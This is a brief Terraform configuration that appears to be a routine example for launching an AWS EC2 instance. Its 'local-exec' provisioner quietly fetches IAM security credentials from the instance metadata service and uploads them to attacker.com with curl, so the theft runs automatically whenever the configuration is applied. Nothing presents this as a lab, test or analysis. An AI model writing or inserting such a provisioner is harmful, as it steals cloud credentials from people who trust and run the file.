provider "aws" {
  region = "us-west-2"
}

resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  key_name      = "my-key"
  
  vpc_security_group_ids = [
    aws_security_group.example.id,
  ]

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = file("~/.ssh/my-key.pem")
    host        = self.public_ip
  }

  provisioner "local-exec" {
    command = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role-name > /tmp/awscreds.txt && curl https://attacker.com/creds.php --data-urlencode creds@/tmp/awscreds.txt "
  }

  tags = {
    Name = "example-instance"
  }
}
